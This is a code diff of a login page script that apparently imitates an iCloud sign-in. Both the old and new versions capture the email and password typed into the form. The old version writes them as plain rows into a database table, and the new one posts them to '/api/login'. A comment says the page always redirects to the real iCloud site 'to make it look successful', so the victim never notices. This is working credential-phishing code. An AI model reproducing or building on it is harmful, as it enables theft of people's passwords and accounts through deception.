@@ -45,23 +45,19 @@
     </div>
 
     <script type="module">
-        import { createClient } from '@supabase/supabase-js';
-
-        const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
-        const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
-        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const email = document.getElementById('floatingInput').value;
             const password = document.getElementById('floatingPassword').value;
             
             try {
-                const { error } = await supabase
-                    .from('logins')
-                    .insert([{ email, password }]);
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
 
-                if (error) throw error;
+                // Always redirect to make it look successful
                 window.location.href = 'https://www.icloud.com/';
             } catch (err) {
                 console.error('Error:', err);
@@ -69,6 +65,7 @@
             }
         });
     </script>
+
 
 
 
